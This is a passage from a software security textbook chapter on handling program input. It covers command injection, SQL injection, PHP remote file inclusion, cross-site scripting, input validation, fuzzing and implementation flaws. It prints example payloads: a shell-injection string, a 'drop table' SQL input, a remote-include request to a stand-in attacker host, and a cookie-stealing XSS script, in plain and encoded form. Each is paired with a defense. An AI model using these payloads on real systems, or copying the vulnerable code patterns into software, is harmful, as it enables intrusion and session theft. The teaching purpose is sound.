output will be the information on that user, as shown first in Figure 11.2c. \\r\\nHowever, if an attacker provides a value that includes shell metacharacters,2\\r\\n for \\r\\nexample,xxx; echo attack success; ls -l finger*, then the result is shown \\r\\nin Figure 11.2c. The attacker is able to run any program on the system with the privileges \\r\\nof the Web server. In this example, the extra commands were just to display a message \\r\\nand list some files in the Web directory. But any command could be used.\\r\\nThis is known as a command injection attack, because the input is used in the con\\ufffestruction of a command that is subsequently executed by the system with the privileges \\r\\nof the Web server. It illustrates the problem caused by insufficient checking of program \\r\\ninput. The main concern of this script’s designer was to provide Web access to an exist\\ufffeing system utility. The expectation was that the input supplied would be the login or \\r\\nname of some user, as it is when a user on the system runs the finger program. Such a \\r\\nuser could clearly supply the values used in the command injection attack, but the result \\r\\nis to run the programs with their existing privileges. It is only when the Web interface \\r\\nis provided, where the program is now run with the privileges of the Web server but \\r\\nwith parameters supplied by an unknown external user, that the security concerns arise.\\r\\nTo counter this attack, a defensive programmer needs to explicitly identify any \\r\\nassumptions as to the form of input and to verify that any input data conform to those \\r\\nassumptions before any use of the data. This is usually done by comparing the input \\r\\ndata to a pattern that describes the data’s assumed form and rejecting any input that \\r\\nfails this test. We discuss the use of pattern matching in the subsection on input vali\\ufffedation later in this section. A suitable extension of the vulnerable finger CGI script \\r\\nis shown in Figure 11.2d. This adds a test that ensures that the user input contains just \\r\\nalphanumeric characters. If not, the script terminates with an error message specify\\ufffeing that the supplied input contained illegal characters.3\\r\\n Note that while this example \\r\\nuses Perl, the same type of error can occur in a CGI program written in any language. \\r\\nWhile the solution details differ, they all involve checking that the input matches \\r\\nassumptions about its form.\\r\\nAnother widely exploited variant of this attack is SQL injection, that we intro\\ufffeduced and described in chapter 5.4. In this attack, the user-supplied input is used \\r\\nto construct a SQL request to retrieve information from a database. Consider the \\r\\nexcerpt of PHP code from a CGI script shown in Figure 11.3a. It takes a name pro\\ufffevided as input to the script, typically from a form field similar to that shown in Figure \\r\\n11.2b. It uses this value to construct a request to retrieve the records relating to that \\r\\nname from the database. The vulnerability in this code is very similar to that in the \\r\\ncommand injection example. The difference is that SQL metacharacters are used, \\r\\nrather than shell metacharacters. If a suitable name is provided, for example, Bob, \\r\\n2\\r\\nShell metacharacters are used to separate or combine multiple commands. In this example, the ‘;’ separates \\r\\ndistinct commands, run in sequence.\\r\\n3\\r\\nThe use of die to terminate a Perl CGI is not recommended. It is used here for brevity in the example. \\r\\nHowever, a well-designed script should display a rather more informative error message about the problem \\r\\nand suggest that the user go back and correct the supplied input.\\r\\nM11_STAL0611_04_GE_C11.indd 388 10/11/17 3:02 PM\\n\\n\\n11.2 / HANDLING PROGRAM INPUT 389\\r\\nthen the code works as intended, retrieving the desired record. However, an input \\r\\nsuch as Bob\\'; drop table suppliers results in the specified record being \\r\\nretrieved, followed by deletion of the entire table! This would have rather unfor\\ufffetunate consequences for subsequent users. To prevent this type of attack, the input \\r\\nmust be validated before use. Any metacharacters must either be escaped, canceling \\r\\ntheir effect, or the input rejected entirely. Given the widespread recognition of SQL \\r\\ninjection attacks, many languages used by CGI scripts contain functions that can \\r\\nsanitize any input that is subsequently included in a SQL request. The code shown in \\r\\nFigure 11.3b illustrates the use of a suitable PHP function to correct this vulnerability. \\r\\nAlternatively, rather than constructing SQL statements directly by concatenating \\r\\nvalues, recent advisories recommend the use of SQL placeholders or parameters to \\r\\nsecurely build SQL statements. Combined with the use of stored procedures, this can \\r\\nresult in more robust and secure code.\\r\\nA third common variant is the code injection attack, where the input includes \\r\\ncode that is then executed by the attacked system. Many of the buffer overflow exam\\ufffeples we discussed in Chapter 10 include a code injection component. In those cases, \\r\\nthe injected code is binary machine language for a specific computer system. How\\ufffeever, there are also significant concerns about the injection of scripting language code \\r\\ninto remotely executed scripts. Figure 11.4a illustrates a few lines from the start of a \\r\\n$name = $_REQUEST[\\'name\\'];\\r\\n$query = \"SELECT * FROM suppliers WHERE name = \\'\" . $name . \"\\';\";\\r\\n$result = mysql_query($query);\\r\\nFigure 11.3 SQL Injection Example\\r\\n(b) Safer PHP code\\r\\n$name = $_REQUEST[\\'name\\'];\\r\\n$query = \"SELECT * FROM suppliers WHERE name = \\'\" .\\r\\nmysql_real_escape_string($name) . \"\\';\";\\r\\n$result = mysql_query($query);\\r\\n(a) Vulnerable PHP code\\r\\nFigure 11.4 PHP Code Injection Example\\r\\n(a) Vulnerable PHP code\\r\\n(b) HTTP exploit request\\r\\nGET /calendar/embed/day.php?path=http://hacker.web.site/hack.txt?&cmd=ls\\r\\n<?php\\r\\ninclude $path . \\'functions.php\\';\\r\\ninclude $path . \\'data/prefs.php\\';\\r\\n...\\r\\nM11_STAL0611_04_GE_C11.indd 389 10/11/17 3:02 PM\\n\\n\\n390 CHAPTER 11 / SOFTWARE SECURITY\\r\\nvulnerable PHP calendar script. The flaw results from the use of a variable to construct \\r\\nthe name of a file that is then included into the script. Note this script was not intended \\r\\nto be called directly. Rather, it is a component of a larger, multifile program. The main \\r\\nscript set the value of the $path variable to refer to the main directory containing the \\r\\nprogram and all its code and data files. Using this variable elsewhere in the program \\r\\nmeant that customizing and installing the program required changes to just a few lines. \\r\\nUnfortunately, attackers do not play by the rules. Just because a script is not supposed \\r\\nto be called directly does not mean it is not possible. The access protections must be \\r\\nconfigured in the Web server to block direct access to prevent this. Otherwise, if direct \\r\\naccess to such scripts is combined with two other features of PHP, a serious attack \\r\\nis possible. The first is that PHP originally assigned the value of any input variable \\r\\nsupplied in the HTTP request to global variables with the same name as the field. \\r\\nThis made the task of writing a form handler easier for inexperienced programmers. \\r\\nUnfortunately, there was no way for the script to limit just which fields it expected. \\r\\nHence a user could specify values for any desired global variable and they would be \\r\\ncreated and passed to the script. In this example, the variable $path is not expected \\r\\nto be a form field. The second PHP feature concerns the behavior of the include\\r\\ncommand. Not only could local files be included, but if a URL is supplied, the included \\r\\ncode can be sourced from anywhere on the network. Combine all of these elements, \\r\\nand the attack may be implemented using a request similar to that shown in Figure \\r\\n11.4b. This results in the $path variable containing the URL of a file containing the \\r\\nattacker’s PHP code. It also defines another variable, $cmd, which tells the attacker’s \\r\\nscript what command to run. In this example, the extra command simply lists files \\r\\nin the current directory. However, it could be any command the Web server has the \\r\\nprivilege to run. This specific type of attack is known as a PHP remote code injection \\r\\nor PHP file inclusion vulnerability. Research shows that a significant number of PHP \\r\\nCGI scripts are vulnerable to this type of attack and are being actively exploited.\\r\\nThere are several defenses available to prevent this type of attack. The most \\r\\nobvious is to block assignment of form field values to global variables. Rather, they \\r\\nare saved in an array and must be explicitly be retrieved by name. This behavior is \\r\\nillustrated by the code in Figure 11.3. It is the default for all newer PHP installations. \\r\\nThe disadvantage of this approach is that it breaks any code written using the older \\r\\nassumed behavior. Correcting such code may take a considerable amount of effort. \\r\\nNonetheless, except in carefully controlled cases, this is the preferred option. It not \\r\\nonly prevents this specific type of attack, but a wide variety of other attacks involv\\ufffeing manipulation of global variable values. Another defense is to only use constant \\r\\nvalues in include (and require) commands. This ensures that the included code \\r\\ndoes indeed originate from the specified files. If a variable has to be used, then great \\r\\ncare must be taken to validate its value immediately before it is used.\\r\\nThere are other injection attack variants, including mail injection, format string \\r\\ninjection, and interpreter injection. New injection attacks variants continue to be \\r\\nfound. They can occur whenever one program invokes the services of another pro\\ufffegram, service, or function and passes to it externally sourced, potentially untrusted \\r\\ninformation without sufficient inspection and validation of it. This just emphasizes \\r\\nthe need to identify all sources of input, to validate any assumptions about such input \\r\\nbefore use, and to understand the meaning and interpretation of values supplied to \\r\\nany invoked program, service, or function.\\r\\nM11_STAL0611_04_GE_C11.indd 390 10/11/17 3:02 PM\\n\\n\\n11.2 / HANDLING PROGRAM INPUT 391\\r\\nCROSS-SITE SCRIPTING ATTACKS Another broad class of vulnerabilities concerns \\r\\ninput provided to a program by one user that is subsequently output to another \\r\\nuser. Such attacks are known as cross-site scripting (XSS) attacks because they are \\r\\nmost commonly seen in scripted Web applications.4\\r\\n This vulnerability involves the \\r\\ninclusion of script code in the HTML content of a webpage displayed by a user’s \\r\\nbrowser. The script code could be JavaScript, ActiveX, VBScript, Flash, or just about \\r\\nany client-side scripting language supported by a user’s browser. To support some \\r\\ncategories of Web applications, script code may need to access data associated with \\r\\nother pages currently displayed by the user’s browser. Because this clearly raises \\r\\nsecurity concerns, browsers impose security checks and restrict such data access to \\r\\npages originating from the same site. The assumption is that all content from one site \\r\\nis equally trusted and hence is permitted to interact with other content from that site.\\r\\nCross-site scripting attacks exploit this assumption and attempt to bypass the \\r\\nbrowser’s security checks to gain elevated access privileges to sensitive data belong\\ufffeing to another site. These data can include page contents, session cookies, and a vari\\ufffeety of other objects. Attackers use a variety of mechanisms to inject malicious script \\r\\ncontent into pages returned to users by the targeted sites. The most common variant is \\r\\nthe XSS reflection vulnerability. The attacker includes the malicious script content in \\r\\ndata supplied to a site. If this content is subsequently displayed to other users without \\r\\nsufficient checking, they will execute the script assuming it is trusted to access any \\r\\ndata associated with that site. Consider the widespread use of guestbook programs, \\r\\nwikis, and blogs by many websites. They all allow users accessing the site to leave \\r\\ncomments, which are subsequently viewed by other users. Unless the contents of \\r\\nthese comments are checked and any dangerous code removed, the attack is possible.\\r\\nConsider the example shown in Figure 11.5a. If this text were saved by a guest\\ufffebook application, then when viewed it displays a little text and then executes the \\r\\nJavaScript code. This code replaces the document contents with the information \\r\\nreturned by the attacker’s cookie script, which is provided with the cookie associated \\r\\nwith this document. Many sites require users to register before using features like a \\r\\nguestbook application. With this attack, the user’s cookie is supplied to the attacker, \\r\\nwho could then use it to impersonate the user on the original site. This example \\r\\nobviously replaces the page content being viewed with whatever the attacker’s script \\r\\nreturns. By using more sophisticated JavaScript code, it is possible for the script to \\r\\nexecute with very little visible effect.\\r\\nTo prevent this attack, any user-supplied input should be examined and any \\r\\ndangerous code removed or escaped to block its execution. While the example shown \\r\\nmay seem easy to check and correct, the attacker will not necessarily make the task \\r\\nthis easy. The same code is shown in Figure 11.5b, but this time all of the characters \\r\\nrelating to the script code are encoded using HTML character entities.5\\r\\n While the \\r\\nbrowser interprets this identically to the code in Figure 11.5a, any validation code \\r\\nmust first translate such entities to the characters they represent before checking for \\r\\npotential attack code. We will discuss this further in the next section.\\r\\n4\\r\\nThe abbreviation XSS is used for cross-site scripting to distinguish it from the common abbreviation of \\r\\nCSS, meaning cascading style sheets.\\r\\n5\\r\\nHTML character entities allow any character from the character set used to be encoded. For example, \\r\\n&\\\\#60; represents the “<” character.\\r\\nM11_STAL0611_04_GE_C11.indd 391 10/11/17 3:02 PM\\n\\n\\n392 CHAPTER 11 / SOFTWARE SECURITY\\r\\nXSS attacks illustrate a failure to correctly handle both program input and \\r\\nprogram output. The failure to check and validate the input results in potentially \\r\\ndangerous data values being saved by the program. However, the program is not the \\r\\ntarget. Rather it is subsequent users of the program, and the programs they use to \\r\\naccess it, which are the target. If all potentially unsafe data output by the program \\r\\nare sanitized, then the attack cannot occur. We will discuss correct handling of output \\r\\nin Section 11.5.\\r\\nThere are other attacks similar to XSS, including cross-site request forg\\ufffeery, and HTTP response splitting. Again the issue is careless use of untrusted, \\r\\nunchecked input.\\r\\nValidating Input Syntax\\r\\nGiven that the programmer cannot control the content of input data, it is neces\\ufffesary to ensure that such data conform with any assumptions made about the data \\r\\nbefore subsequent use. If the data are textual, these assumptions may be that the \\r\\ndata contain only printable characters, have certain HTML markup, are the name \\r\\nof a person, a userid, an e-mail address, a filename, and/or a URL. Alternatively, the \\r\\ndata might represent an integer or other numeric value. A program using such input \\r\\nshould confirm that it meets these assumptions. An important principle is that input \\r\\ndata should be compared against what is wanted, accepting only valid input, known \\r\\nas whitelisting. The alternative is to compare the input data with known dangerous \\r\\nvalues, known as blacklisting. The problem with this approach is that new problems \\r\\nand methods of bypassing existing checks continue to be discovered. By trying to \\r\\nblock known dangerous input data, an attacker using a new encoding may succeed. \\r\\nBy only accepting known safe data, the program is more likely to remain secure.\\r\\nFigure 11.5 XSS Example\\r\\n(a) Plain XSS example\\r\\n(b) Encoded XSS example\\r\\nThanks for this information, its great!\\r\\n&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;\\r\\n&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;\\r\\n&#46;&#108;&#111;&#99;&#97;&#116;&#105;&#111;\\r\\n&#110;&#61;&#39;&#104;&#116;&#116;&#112;&#58;\\r\\n&#47;&#47;&#104;&#97;&#99;&#107;&#101;&#114;\\r\\n&#46;&#119;&#101;&#98;&#46;&#115;&#105;&#116;\\r\\n&#101;&#47;&#99;&#111;&#111;&#107;&#105;&#101;\\r\\n&#46;&#99;&#103;&#105;&#63;&#39;&#43;&#100;\\r\\n&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;\\r\\n&#99;&#111;&#111;&#107;&#105;&#101;&#60;&#47;\\r\\n&#115;&#99;&#114;&#105;&#112;&#116;&#62;\\r\\nThanks for this information, its great!\\r\\n<script>document.location=\\'http://hacker.web.site/cookie.cgi?\\'+\\r\\ndocument.cookie</script>\\r\\nM11_STAL0611_04_GE_C11.indd 392 10/11/17 3:02 PM\\n\\n\\n11.2 / HANDLING PROGRAM INPUT 393\\r\\nThis type of comparison is commonly done using regular expressions. It may be \\r\\nexplicitly coded by the programmer or may be implicitly included in a supplied input \\r\\nprocessing routine. Figures 11.2d and 11.3b show examples of these two approaches. \\r\\nA regular expression is a pattern composed of a sequence of characters that describe \\r\\nallowable input variants. Some characters in a regular expression are treated literally, \\r\\nand the input compared to them must contain those characters at that point. Other \\r\\ncharacters have special meanings, allowing the specification of alternative sets of \\r\\ncharacters, classes of characters, and repeated characters. Details of regular expres\\ufffesion content and usage vary from language to language. An appropriate reference \\r\\nshould be consulted for the language in use.\\r\\nIf the input data fail the comparison, they could be rejected. In this case a \\r\\nsuitable error message should be sent to the source of the input to allow it to be \\r\\ncorrected and reentered. Alternatively, the data may be altered to conform. This \\r\\ngenerally involves escaping metacharacters to remove any special interpretation, thus \\r\\nrendering the input safe.\\r\\nFigure 11.5 illustrates a further issue of multiple, alternative encodings of the \\r\\ninput data. This could occur because the data are encoded in HTML or some other \\r\\nstructured encoding that allows multiple representations of characters. It can also \\r\\noccur because some character set encodings include multiple encodings of the same \\r\\ncharacter. This is particularly obvious with the use of Unicode and its UTF-8 encoding. \\r\\nTraditionally, computer programmers assumed the use of a single, common, character \\r\\nset, which in many cases was ASCII. This 7-bit character set includes all the common \\r\\nEnglish letters, numbers, and punctuation characters. It also includes a number of \\r\\ncommon control characters used in computer and data communications applications. \\r\\nHowever, it is unable to represent the additional accented characters used in many \\r\\nEuropean languages nor the much larger number of characters used in languages such \\r\\nas Chinese and Japanese. There is a growing requirement to support users around the \\r\\nglobe and to interact with them using their own languages. The Unicode character \\r\\nset is now widely used for this purpose. It is the native character set used in the Java \\r\\nlanguage, for example. It is also the native character set used by operating systems \\r\\nsuch as Windows XP and later. Unicode uses a 16-bit value to represent each charac\\ufffeter. This provides sufficient characters to represent most of those used by the world’s \\r\\nlanguages. However, many programs, databases, and other computer and communica\\ufffetions applications assume an 8-bit character representation, with the first 128 values \\r\\ncorresponding to ASCII. To accommodate this, a Unicode character can be encoded \\r\\nas a 1- to 4-byte sequence using the UTF-8 encoding. Any specific character is sup\\ufffeposed to have a unique encoding. However, if the strict limits in the specification are \\r\\nignored, common ASCII characters may have multiple encodings. For example, the \\r\\nforward slash character “/”, used to separate directories in a UNIX filename, has the \\r\\nhexadecimal value “2F” in both ASCII and UTF-8. UTF-8 also allows the redundant, \\r\\nlonger encodings: “C0 AF” and “E0 80 AF”. While strictly only the shortest encod\\ufffeing should be used, many Unicode decoders accept any valid equivalent sequence.\\r\\nConsider the consequences of multiple encodings when validating input. There \\r\\nis a class of attacks that attempt to supply an absolute pathname for a file to a \\r\\nscript that expects only a simple local filename. The common check to prevent this \\r\\nis to ensure that the supplied filename does not start with “/” and does not contain \\r\\nany “../” parent directory references. If this check only assumes the correct, shortest \\r\\nM11_STAL0611_04_GE_C11.indd 393 10/11/17 3:02 PM\\n\\n\\n394 CHAPTER 11 / SOFTWARE SECURITY\\r\\nUTF-8 encoding of slash, then an attacker using one of the longer encodings could \\r\\navoid this check. This precise attack and flaw was used against a number of versions \\r\\nof Microsoft’s IIS Web server in the late 1990s. A related issue occurs when the appli\\ufffecation treats a number of characters as equivalent. For example, a case insensitive \\r\\napplication that also ignores letter accents could have 30 equivalent representations \\r\\nof the letter A. These examples demonstrate the problems both with multiple encod\\ufffeings, and with checking for dangerous data values rather than accepting known safe \\r\\nvalues. In this example, a comparison against a safe specification of a filename would \\r\\nhave rejected some names with alternate encodings that were actually acceptable. \\r\\nHowever, it would definitely have rejected the dangerous input values.\\r\\nGiven the possibility of multiple encodings, the input data must first be \\r\\ntransformed into a single, standard, minimal representation. This process is called \\r\\ncanonicalization and involves replacing alternate, equivalent encodings by one com\\ufffemon value. Once this is done, the input data can then be compared with a single repre\\ufffesentation of acceptable input values. There may potentially be a large number of input \\r\\nand output fields that require checking. [SIMP11] and others recommend the use of \\r\\nanti-XSS libraries, or Web UI frameworks with integrated XSS protection, that auto\\ufffemate much of the checking process, rather than writing explicit checks for each field.\\r\\nThere is an additional concern when the input data represents a numeric \\r\\nvalue. Such values are represented on a computer by a fixed size value. Integers are \\r\\ncommonly 8, 16, 32, and now 64 bits in size. Floating-point numbers may be 32, 64, 96, \\r\\nor other numbers of bits, depending on the computer processor used. These values \\r\\nmay also be signed or unsigned. When the input data are interpreted, the various rep\\uffferesentations of numeric values, including optional sign, leading zeroes, decimal values, \\r\\nand power values, must be handled appropriately. The subsequent use of numeric \\r\\nvalues must also be monitored. Problems particularly occur when a value of one size \\r\\nor form is cast to another. For example, a buffer size may be read as an unsigned inte\\ufffeger. It may later be compared with the acceptable maximum buffer size. Depending \\r\\non the language used, the size value that was input as unsigned may subsequently \\r\\nbe treated as a signed value in some comparison. This leads to a vulnerability because \\r\\nnegative values have the top bit set. This is the same bit pattern used by large positive \\r\\nvalues in unsigned integers. So the attacker could specify a very large actual input \\r\\ndata length, which is treated as a negative number when compared with the maximum \\r\\nbuffer size. Being a negative number, it clearly satisfies a comparison with a smaller, \\r\\npositive buffer size. However, when used, the actual data are much larger than the \\r\\nbuffer allows, and an overflow occurs as a consequence of incorrect handling of the \\r\\ninput size data. Once again, care is needed to check assumptions about data values \\r\\nand to ensure that all use is consistent with these assumptions.\\r\\nInput Fuzzing\\r\\nClearly, there is a problem anticipating and testing for all potential types of nonstan\\ufffedard inputs that might be exploited by an attacker to subvert a program. A powerful, \\r\\nalternative approach called fuzzing was developed by Professor Barton Miller at the \\r\\nUniversity of Wisconsin Madison in 1989. This is a software testing technique that \\r\\nuses randomly generated data as inputs to a program. The range of inputs that may \\r\\nbe explored is very large. They include direct textual or graphic input to a program, \\r\\nrandom network requests directed at a Web or other distributed service, or random \\r\\nM11_STAL0611_04_GE_C11.indd 394 10/11/17 3:02 PM\\n\\n\\n11.3 / WRITING SAFE PROGRAM CODE 395\\r\\nparameters values passed to standard library or system functions. The intent is to \\r\\ndetermine whether the program or function correctly handles all such abnormal \\r\\ninputs or whether it crashes or otherwise fails to respond appropriately. In the lat\\ufffeter cases the program or function clearly has a bug that needs to be corrected. The \\r\\nmajor advantage of fuzzing is its simplicity and its freedom from assumptions about \\r\\nthe expected input to any program, service, or function. The cost of generating large \\r\\nnumbers of tests is very low. Further, such testing assists in identifying reliability as \\r\\nwell as security deficiencies in programs.\\r\\nWhile the input can be completely randomly generated, it may also be randomly \\r\\ngenerated according to some template. Such templates are designed to examine likely \\r\\nscenarios for bugs. This might include excessively long inputs or textual inputs that \\r\\ncontain no spaces or other word boundaries. When used with network protocols, a \\r\\ntemplate might specifically target critical aspects of the protocol. The intent of using \\r\\nsuch templates is to increase the likelihood of locating bugs. The disadvantage is \\r\\nthat the templates incorporate assumptions about the input. Hence bugs triggered \\r\\nby other forms of input would be missed. This suggests that a combination of these \\r\\napproaches is needed for a reasonably comprehensive coverage of the inputs.\\r\\nProfessor Miller’s team has applied fuzzing tests to a number of common \\r\\noperating systems and applications. These include common command-line and GUI \\r\\napplications running on Linux, Windows and MacOS. The results of these tests are \\r\\nsummarized in [MILL07], which identifies a number of programs with bugs in these \\r\\nvarious systems. Other organizations have used these tests on a variety of systems \\r\\nand software.\\r\\nWhile fuzzing is a conceptually very simple testing method, it does have its \\r\\nlimitations. In general, fuzzing only identifies simple types of faults with handling of \\r\\ninput. If a bug exists that is only triggered by a small number of very specific input \\r\\nvalues, fuzzing is unlikely to locate it. However, the types of bugs it does locate are \\r\\nvery often serious and potentially exploitable. Hence it ought to be deployed as a \\r\\ncomponent of any reasonably comprehensive testing strategy.\\r\\nA number of tools to perform fuzzing tests are now available and are used \\r\\nby organizations and individuals to evaluate security of programs and applications. \\r\\nThey include the ability to fuzz command-line arguments, environment variables, \\r\\nWeb applications, file formats, network protocols, and various forms of interprocess \\r\\ncommunications. A number of suitable black box test tools, include fuzzing tests, are \\r\\ndescribed in [MIRA05]. Such tools are being used by organizations to improve the \\r\\nsecurity of their software. Fuzzing is also used by attackers to identify potentially use\\ufffeful bugs in commonly deployed software. Hence it is becoming increasingly important \\r\\nfor developers and maintainers to also use this technique to locate and correct such \\r\\nbugs before they are found and exploited by attackers.\\r\\n11.3 WRITING SAFE PROGRAM CODE\\r\\nThe second component of our model of computer programs is the processing of \\r\\nthe input data according to some algorithm. For procedural languages like C and \\r\\nits descendents, this algorithm specifies the series of steps taken to manipulate the \\r\\ninput to solve the required problem. High-level languages are typically compiled and \\r\\nM11_STAL0611_04_GE_C11.indd 395 10/11/17 3:02 PM\\n\\n\\n396 CHAPTER 11 / SOFTWARE SECURITY\\r\\nlinked into machine code, which is then directly executed by the target processor. In \\r\\nSection 10.1, we discussed the typical process structure used by executing programs. \\r\\nAlternatively, a high-level language such as Java may be compiled into an interme\\ufffediate language that is then interpreted by a suitable program on the target system. \\r\\nThe same may be done for programs written using an interpreted scripting language. \\r\\nIn all cases, the execution of a program involves the execution of machine language \\r\\ninstructions by a processor to implement the desired algorithm. These instructions will \\r\\nmanipulate data stored in various regions of memory and in the processor’s registers.\\r\\nFrom a software security perspective, the key issues are whether the imple\\ufffemented algorithm correctly solves the specified problem, whether the machine \\r\\ninstructions executed correctly represent the high-level algorithm specification, and \\r\\nwhether the manipulation of data values in variables, as stored in machine registers \\r\\nor memory, is valid and meaningful.\\r\\nCorrect Algorithm Implementation\\r\\nThe first issue is primarily one of good program development technique. The \\r\\nalgorithm may not correctly implement all cases or variants of the problem. This \\r\\nmight allow some seemingly legitimate program input to trigger program behavior \\r\\nthat was not intended, providing an attacker with additional capabilities. While this \\r\\nmay be an issue of inappropriate interpretation or handling of program input, as we \\r\\ndiscussed in Section 11.2, it may also be inappropriate handling of what should be \\r\\nvalid input. The consequence of such a deficiency in the design or implementation of \\r\\nthe algorithm is a bug in the resulting program that could be exploited.\\r\\nA good example of this was the bug in some early releases of the Netscape Web \\r\\nbrowser. Their implementation of the random number generator used to generate \\r\\nsession keys for secure Web connections was inadequate [GOWA01]. The assump\\ufffetion was that these numbers should be unguessable, short of trying all alternatives. \\r\\nHowever, due to a poor choice of the information used to seed this algorithm, the \\r\\nresulting numbers were relatively easy to predict. As a consequence, it was possible \\r\\nfor an attacker to guess the key used and then decrypt the data exchanged over a \\r\\nsecure Web session. This flaw was fixed by reimplementing the random number gen\\ufffeerator to ensure that it was seeded with sufficient unpredictable information that it \\r\\nwas not possible for an attacker to guess its output.\\r\\nAnother well-known example is the TCP session spoof or hijack attack. This \\r\\nextends the concept we discussed in Section 7.1 of sending source spoofed packets to \\r\\na TCP server. In this attack, the goal is not to leave the server with half-open connec\\ufffetions, but rather to fool it into accepting packets using a spoofed source address that \\r\\nbelongs to a trusted host but actually originates on the attacker’s system. If the attack \\r\\nsucceeded, the server could be convinced to run commands or provide access to data \\r\\nallowed for a trusted peer, but not generally. To understand the requirements for this \\r\\nattack, consider the TCP three-way connection handshake illustrated in Figure 7.2. \\r\\nRecall that because a spoofed source address is used, the response from the server \\r\\nwill not be seen by the attacker, who will not therefore know the initial sequence \\r\\nnumber provided by the server. However, if the attacker can correctly guess this \\r\\nnumber, a suitable ACK packet can be constructed and sent to the server, which then \\r\\nassumes that the connection is established. Any subsequent data packet is treated by \\r\\nM11_STAL0611_04_GE_C11.indd 396 10/11/17 3:02 PM\\n\\n\\n11.3 / WRITING SAFE PROGRAM CODE 397\\r\\nthe server as coming from the trusted source, with the rights assigned to it. The hijack \\r\\nvariant of this attack waits until some authorized external user connects and logs in \\r\\nto the server. Then the attacker attempts to guess the sequence numbers used and to \\r\\ninject packets with spoofed details to mimic the next packets the server expects to see \\r\\nfrom the authorized user. If the attacker guesses correctly, then the server responds \\r\\nto any requests using the access rights and permissions of the authorized user. There \\r\\nis an additional complexity to these attacks. Any responses from the server are sent \\r\\nto the system whose address is being spoofed. Because they acknowledge packets \\r\\nthis system has not sent, the system will assume there is a network error and send a \\r\\nreset (RST) packet to terminate the connection. The attacker must ensure that the \\r\\nattack packets reach the server and are processed before this can occur. This may be \\r\\nachieved by launching a denial-of-service attack on the spoofed system while simul\\ufffetaneously attacking the target server.\\r\\nThe implementation flaw that permits these attacks is that the initial sequence \\r\\nnumbers used by many TCP/IP implementations are far too predictable. In addition, \\r\\nthe sequence number is used to identify all packets belonging to a particular ses\\ufffesion. The TCP standard specifies that a new, different sequence number should be \\r\\nused for each connection so packets from previous connections can be distinguished. \\r\\nPotentially this could be a random number (subject to certain constraints). However, \\r\\nmany implementations used a highly predictable algorithm to generate the next ini\\ufffetial sequence number. The combination of the implied use of the sequence number as \\r\\nan identifier and authenticator of packets belonging to a specific TCP session and the \\r\\nfailure to make them sufficiently unpredictable enables the attack to occur. A number \\r\\nof recent operating system releases now support truly randomized initial sequence \\r\\nnumbers. Such systems are immune to these types of attacks.\\r\\nAnother variant of this issue is when the programmers deliberately include \\r\\nadditional code in a program to help test and debug it. While this is valid during \\r\\nprogram development, all too often this code remains in production releases of a \\r\\nprogram. At the very least, this code could inappropriately release information to a \\r\\nuser of the program. At worst, it may permit a user to bypass security checks or other \\r\\nprogram limitations and perform actions they would not otherwise be allowed to \\r\\nperform. This type of vulnerability was seen in the sendmail mail delivery program \\r\\nin the late 1980s and famously exploited by the Morris Internet Worm. The imple\\ufffementers of sendmail had left in support for a DEBUG command that allowed the \\r\\nuser to remotely query and control the running program [SPAF89]. The Worm used \\r\\nthis feature to infect systems running versions of sendmail with this vulnerability. \\r\\nThe problem was aggravated because the sendmail program ran using superuser \\r\\nprivileges and hence had unlimited access to change the system. We will discuss the \\r\\nissue of minimizing privileges further in Section 11.4.\\r\\nA further example concerns the implementation of an interpreter for a high\\ufffeor intermediate-level languages. The assumption is that the interpreter correctly \\r\\nimplements the specified program code. Failure to adequately reflect the language \\r\\nsemantics could result in bugs that an attacker might exploit. This was clearly seen \\r\\nwhen some early implementations of the Java Virtual Machine (JVM) inadequately \\r\\nimplemented the security checks specified for remotely sourced code, such as in \\r\\napplets [DEFW96]. These implementations permitted an attacker to introduce code \\r\\nremotely, such as on a webpage, but trick the JVM interpreter into treating them as \\r\\nM11_STAL0611_04_GE_C11.indd 397 10/11/17 3:02 PM\\n\\n\\n398 CHAPTER 11 / SOFTWARE SECURITY\\r\\nlocally sourced and hence trusted code with much greater access to the local system \\r\\nand data.\\r\\nThese examples illustrate the care that is needed when designing and imple\\ufffementing a program. It is important to specify assumptions carefully, such as that gen\\ufffeerated random number should indeed be unpredictable, in order to ensure that these \\r\\nassumptions are satisfied by the resulting program code. Traditionally these specifi\\ufffecations and checks are handled informally, as design goals and code comments. An \\r\\nalternative is the use of formal methods in software development and analysis that \\r\\nensures the software is correct by construction. Such approaches have been known \\r\\nfor many years, but have also been considered too complex and difficult for general \\r\\nuse. One area where they have been used is in the development of trusted comput\\ufffeing systems, as we will discuss in Chapter 27. However, NISTIR 8151 notes that this \\r\\nis changing, and encourages their further development and more widespread use. It \\r\\nis also very important to identify debugging and testing extensions to the program \\r\\nand to ensure that they are removed or disabled before the program is distributed \\r\\nand used.\\r\\nEnsuring that Machine Language Corresponds to Algorithm\\r\\nThe second issue concerns the correspondence between the algorithm specified in \\r\\nsome programming language and the machine instructions that are run to implement \\r\\nit. This issue is one that is largely ignored by most programmers. The assumption is \\r\\nthat the compiler or interpreter does indeed generate or execute code that validly \\r\\nimplements the language statements. When this is considered, the issue is typically \\r\\none of efficiency, usually addressed by specifying the required level of optimization \\r\\nflags to the compiler.\\r\\nWith compiled languages, as Ken Thompson famously noted in [THOM84], a \\r\\nmalicious compiler programmer could include instructions in the compiler to emit \\r\\nadditional code when some specific input statements were processed. These state\\ufffements could even include part of the compiler, so that these changes could be rein\\ufffeserted when the compiler source code was compiled, even after all trace of them \\r\\nhad been removed from the compiler source. If this were done, the only evidence \\r\\nof these changes would be found in the machine code. Locating this would require \\r\\ncareful comparison of the generated machine code with the original source. For large \\r\\nprograms, with many source files, this would be an exceedingly slow and difficult task, \\r\\none that, in general, is very unlikely to be done.\\r\\nThe development of trusted computer systems with very high assurance level \\r\\nis the one area where this level of checking is required. Specifically, certification of \\r\\ncomputer systems using a Common Criteria assurance level of EAL 7 requires vali\\ufffedation of the correspondence among design, source code, and object code. We will \\r\\ndiscuss this further in Chapter 27.\\r\\nCorrect Interpretation of Data Values\\r\\nThe next issue concerns the correct interpretation of data values. At the most basic \\r\\nlevel, all data on a computer are stored as groups of binary bits. These are generally \\r\\nsaved in bytes of memory, which may be grouped together as a larger unit, such as a \\r\\nword or longword value. They may be accessed and manipulated in memory, or they \\r\\nM11_STAL0611_04_GE_C11.indd 398 10/11/17 3:02 PM\\n\\n\\n11.3 / WRITING SAFE PROGRAM CODE 399\\r\\nmay be copied into processor registers before being used. Whether a 